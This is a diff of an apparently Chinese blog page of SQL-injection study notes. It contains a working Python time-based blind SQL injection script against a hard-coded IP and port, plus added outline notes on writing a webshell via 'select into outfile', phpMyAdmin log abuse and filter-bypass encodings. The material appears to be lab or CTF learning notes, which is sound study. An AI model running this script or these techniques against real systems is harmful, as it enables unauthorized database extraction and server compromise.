@@ -292,7 +292,7 @@
 <h4 id="脚本示例"><a href="#脚本示例" class="headerlink" title="脚本示例"></a>脚本示例</h4><ul>
 <li>sleep</li>
 </ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">dbname = <span class="string">''</span></span><br><span class="line">zidian=<span class="string">"qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> zidian:</span><br><span class="line">    <span class="comment"># 修改此处获取数据表、字段等值</span></span><br><span class="line">    url=<span class="string">"http://222.18.158.254:4609/?id=1 and if(asci(substr(database(),&#123;0&#125;,1))='&#123;1&#125;',sleep(5),1)"</span>.format(str(j),ord(i))</span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a.elapsed.total_seconds()&gt;=<span class="number">5</span>):</span><br><span class="line">      <span class="keyword">print</span> url</span><br><span class="line">      <span class="keyword">print</span> <span class="string">"succeess"</span></span><br><span class="line">      </span><br><span class="line">      dbname = dbname+i</span><br><span class="line">      <span class="keyword">print</span> dbname</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> dbname</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">dbname = <span class="string">''</span></span><br><span class="line">zidian=<span class="string">"qwertyuiopasdfghjklzxcvbnm-_&#123;&#125;"</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> zidian:</span><br><span class="line">    <span class="comment"># 修改此处获取数据表、字段等值</span></span><br><span class="line">    url=<span class="string">"http://222.18.158.254:4609/?id=1 and if(asci(substr(database(),&#123;0&#125;,1))='&#123;1&#125;',sleep(5),1)"</span>.format(str(j),ord(i))</span><br><span class="line">    <span class="comment"># t1 = time.time()</span></span><br><span class="line">    a=requests.get(url)</span><br><span class="line">    <span class="comment"># t2 = time.time()</span></span><br><span class="line">    <span class="comment"># total_time = t2 - t1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(a.elapsed.total_seconds()&gt;=<span class="number">5</span>):</span><br><span class="line">      <span class="keyword">print</span> url</span><br><span class="line">      <span class="keyword">print</span> <span class="string">"succeess"</span></span><br><span class="line">      </span><br><span class="line">      dbname = dbname+i</span><br><span class="line">      <span class="keyword">print</span> dbname</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> dbname</span><br></pre></td></tr></table></figure>
 
 <ul>
 <li>benchmark</li>
@@ -364,10 +364,26 @@
 
 
 
-<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ul>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><ul>
+<li>select into outfile<ul>
+<li>前提：需知道物理路径 ,secure_file_priv = on<ul>
+<li>@@basedir</li>
+<li>phpinfo()</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><h2 id="phpmyadmin：日志漏洞"><a href="#phpmyadmin：日志漏洞" class="headerlink" title="phpmyadmin：日志漏洞"></a>phpmyadmin：日志漏洞</h2></li>
+</ul>
+<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><ul>
 <li>双写绕过  大小写绕过</li>
 <li>|| &amp;&amp; 绕过and or</li>
+<li>编码绕过<ul>
+<li>hex编码 </li>
+<li>ascii编码</li>
 <li></li>
+</ul>
+</li>
 </ul>
 
         </div>
@@ -391,7 +407,7 @@
                 <a class="prev" rel="prev" href="/2025/12/12/upload-labs%E9%9D%B6%E5%9C%BAWP/">upload-labs靶场WP</a>
             
             
-            <a class="next" rel="next" href="/2020/06/23/python%E7%88%AC%E8%99%AB-%E5%8D%95&%E5%A4%9A%E7%BA%BF%E7%A8%8B/">python爬虫-单&多线程</a>
+            <a class="next" rel="next" href="/2025/12/12/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a>
             
         </section>
 
